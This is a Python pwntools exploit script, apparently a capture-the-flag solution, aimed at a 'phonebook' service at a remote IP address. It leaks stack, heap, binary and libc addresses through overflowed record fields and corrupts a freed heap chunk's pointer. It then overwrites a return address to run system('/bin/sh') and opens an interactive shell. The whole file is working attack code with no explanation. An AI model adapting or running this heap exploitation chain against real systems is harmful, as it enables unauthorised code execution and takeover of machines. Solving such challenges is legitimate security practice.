from pwn import *
import time

#r = process("./phonebook")
#r = remote("0", 5556)
r = remote("35.187.198.163", 31259)

def make(name, tel, birth):
	#print r.recv()
	r.sendline("1")
	#print "send 1"
	time.sleep(0.1)
	#print r.recv()
	r.sendline(name)
	#print "send name"
	time.sleep(0.1)
	#print r.recv()
	r.sendline(tel)
	time.sleep(0.1)
	#print r.recv()
	r.sendline(birth)
	time.sleep(0.1)
	#print "make"

def delete(index):
	r.recv()
	r.sendline("3")
	r.recv()
	r.sendline(str(index))	
	#print "delete"

def leak_stack():
	r.recv()
	r.sendline("2")
	#print r.recv()
	r.recvuntil("1"*40)
	leak = u32(r.recv(4))
	stack = u32(r.recv(4))
	print "leaked address : " + hex(leak)
	print "stack address : " + hex(stack)
	return leak, stack

def leak_heap():
	r.recv()
	r.sendline("2")
	r.recvuntil("3"*15)
	r.recv(1)
	heap = u32(r.recv(4))
	print "heap address : " + hex(heap)
	return heap


def leak_libc():
	r.recv()
	r.sendline("2")
	r.recvuntil("Name : ")
	r.recvuntil("Name : ")
	r.recvuntil("Name : ")
	libc_main = u32(r.recv(4))
	print "libc_start_main_ret : " + hex(libc_main)
	return libc_main - 0x19af3

def leak_read():
        r.recv()
        r.sendline("2")
        r.recvuntil("Name : ")
        r.recvuntil("Name : ")
        r.recvuntil("Name : ")
        read = u32(r.recv(4))
        print "read : " + hex(read)
        return read

def modify(index, select, data):
	r.recv()
	r.sendline("4")
	r.recv()
	r.sendline(str(index))
	r.recv()
	r.sendline(str(select))	#1.Name  2.Phone 3.Birth
	r.recv()
	r.send(data)
	#print "modify"


r.recv()
r.sendline("10")
time.sleep(0.1)
# leak stack, binary address

make('1'*40, "1111", "1111")	#1
#r.interactive()
#print r.recv()
#r.sendline("2")
#print r.recv()
modify(1, 1, "1"*40)
leak, stack = leak_stack()

base = leak - 0x1829
print "binary : " + hex(base)
ret = base + 0xb11		#insert()'s ret
fake = stack + 0x14 	#to make fake chunk
libcAdd = stack + 0x58 	#main_ret in stack
countP = stack + 0x44+0x10
read_got = base + 0x2F98

# leak heap address
make("2222", "2222", "2222")	#2
make("3333", "3333", "3"*15)	#3
make("4444", "4444", "4444")	#4

delete(2)	#3
heap = leak_heap()
BinSh = heap - 0x20
print "/bin/sh address : " + hex(BinSh)


# leak libc_start_main_ret
modify(2, 3, "3"*16+p32(libcAdd)+p32(heap+0x10)+p32(heap+0x20))	#2/ birth

libc_base = leak_libc()
print "Libc_base : " + hex(libc_base)
system = libc_base + 0x00040310
print "system address : " + hex(system)

modify(2, 3, "3"*16+p32(read_got)+p32(heap+0x10)+p32(heap+0x20))
read = leak_read()

#modify(3, 1, "AAAA")

modify(2, 3, "3"*16+p32(heap)+p32(heap+0x10)+p32(heap+0x20))


# make fake chunk
make("5555","5555","/bin/sh\x00")	#4
make("6"*40, "6"*40, p32(heap)+p32(system)+"6666"+p32(BinSh)+"6"*24)	#5
make("7"*40, "7"*40, "7"*40)	#6

delete(6)	#6
#print r.recv()

# modify fd
modify(6, 2, p32(fake-8))	#6
#print r.recv()
modify(2, 3, "/bin/sh\x00")	#2
#print r.recv()
#r.interactive()
# exploit

make("8"*40, "8"*40, "8"*20+p32(ret)+p32(system)+p32(countP)+p32(BinSh)+"8"*12)
r.interactive()


